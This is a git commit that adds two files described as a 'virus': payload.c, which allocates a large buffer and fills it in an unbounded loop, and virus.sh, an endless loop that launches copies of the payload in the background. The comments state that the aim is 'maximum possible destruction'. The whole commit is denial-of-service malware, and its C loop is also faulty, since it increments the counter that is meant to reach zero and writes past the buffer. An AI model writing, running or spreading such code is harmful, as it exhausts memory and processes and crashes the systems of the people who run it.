0f65aa4cf7fd43b1b47300818c75598e3d7fd5c0
Aviruk Basak <avirukbasak@gmail.com>
2021-03-18 00:53:21 +0530

    New files

---
+++ payload.c
@@ -0,0 +1,16 @@
+#include <stdlib.h>
+#define COEFFICIENT (1)
+int main () {
+	/* if size_t (i.e. long) is 8B, malloc() allocates 8GB regardless of how much RAM you have
+	 * this DUMBNESS of malloc() is what makes the virus tick.
+	 */
+	size_t n = (COEFFICIENT * sizeof (size_t) * 1024 * 1024 * 1024);
+	size_t *ptr = (size_t *) malloc (n);
+	while (n != 0) {
+		// just put in some garbage, 18 dig
+		*(ptr ++) = 193848392937585938;
+		n ++;
+	}
+	return 0;
+}
+
---
+++ virus.sh
@@ -0,0 +1,7 @@
+# "&" is used to background the task hence we can use a loop (infinite)
+#+ and open more payloads for the maximum possible destruction. :)
+while [ 1 = 1 ]
+do
+	./payload &
+done
+
